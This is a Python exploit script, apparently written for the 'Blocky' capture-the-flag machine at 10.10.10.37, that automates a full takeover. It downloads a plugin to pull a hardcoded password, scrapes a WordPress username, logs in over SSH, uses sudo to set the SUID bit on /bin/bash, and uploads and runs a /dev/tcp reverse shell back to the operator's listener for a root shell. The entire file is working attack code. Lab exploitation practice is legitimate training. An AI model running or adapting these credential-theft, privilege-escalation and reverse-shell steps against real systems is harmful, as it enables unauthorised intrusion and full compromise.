#!/usr/bin/python3

import zipfile
from pwn import * # pip3 install pwn
import requests

banner = """
    ____  __           __                           __        ____ _       ___   __
   / __ )/ /___  _____/ /____  __      ____ ___  __/ /_____  / __ \ |     / / | / /
  / __  / / __ \/ ___/ //_/ / / /_____/ __ `/ / / / __/ __ \/ /_/ / | /| / /  |/ / 
 / /_/ / / /_/ / /__/ ,< / /_/ /_____/ /_/ / /_/ / /_/ /_/ / ____/| |/ |/ / /|  /  
/_____/_/\____/\___/_/|_|\__, /      \__,_/\__,_/\__/\____/_/     |__/|__/_/ |_/   
                        /____/                                                     

                                                       by z3r0byte <3
"""

# ctrl + c
def def_handler(sig, frame):

    print("\n[!] Saliendo...\n")
    os.system("rm -rf com/ META-INF/ *sh *zip")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


# variables globales

plugin_url = 'http://10.10.10.37/plugins/files/BlockyCore.jar'
blog_post_url = 'http://10.10.10.37/index.php/2017/07/02/welcome-to-blockycraft/'

# main function

def main():

    # Mostramos el banner

    print(banner)

    # Descargamos el plugin

    p1 = log.progress("Extracción de credenciales")
    p1.status("Descargando plugin")
    time.sleep(2)

    plugin = requests.get(plugin_url)

    open('./plugin.zip', 'wb').write(plugin.content)

    # descomprimimos plugin

    p1.status("Descomprimiendo plugin")
    time.sleep(2)

    with zipfile.ZipFile("plugin.zip","r") as zip_file:
        zip_file.extractall("./")

    # buscamos contraseña dentro del plugin

    p1.status("Buscando contraseña dentro del plugin")
    time.sleep(2)

    password = subprocess.check_output("strings com/myfirstplugin/BlockyCore.class | sed -n '11p'", shell=True, universal_newlines=True)


    # Extraemos usuario del blog de wordpress
    
    p1.status("Extrayendo usuario")
    time.sleep(2)

    r = requests.get(blog_post_url)

    username = re.findall(r'author/notch/">(.*?)</a></span>', r.text)[0]
    
    p1.success()
    # Hacemos un tratamiento de las credenciales para quitar espacios y saltos de línea innecesarios
    password = password.strip("\n")
    password = password.strip()
    username = username.lower()
    # creamos archivos para escalada de privilegios

    os.system("echo \"#!/bin/bash \nchmod u+s /bin/bash\" > bash-SUID.sh")
    LHOST=str(input("Introduce tu LHOST tun0 -> "))
    LHOST = LHOST.strip("\n")
    os.system("echo \"#!/bin/bash \nbash -i >& /dev/tcp/"+LHOST+"/4444 0>&1\" > revshell.sh")

    # conexión via SSH y escalada de privilegios

    def SSH():    
        shell = ssh(username, '10.10.10.37', password=password, port=22)
        shell.upload(b"./bash-SUID.sh", remote="/tmp/bash-SUID.sh")
        shell.upload(b"./revshell.sh", remote="/tmp/revshell.sh")
        term = shell.run(b"bash")
        term.sendline("echo "+password+" | sudo -S bash /tmp/bash-SUID.sh")
        term.sendline("bash /tmp/revshell.sh")


    try:
        threading.Thread(target=SSH, args=()).start()
    except Exception as e:
        log.error(str(e))

    

    sh = listen(4444, timeout=120).wait_for_connection()
    if sh.sock is None:
        sys.exit(1)
    else:
        
        sh.sendline("bash -p")
        sh.interactive()


if __name__ == '__main__':

    main()
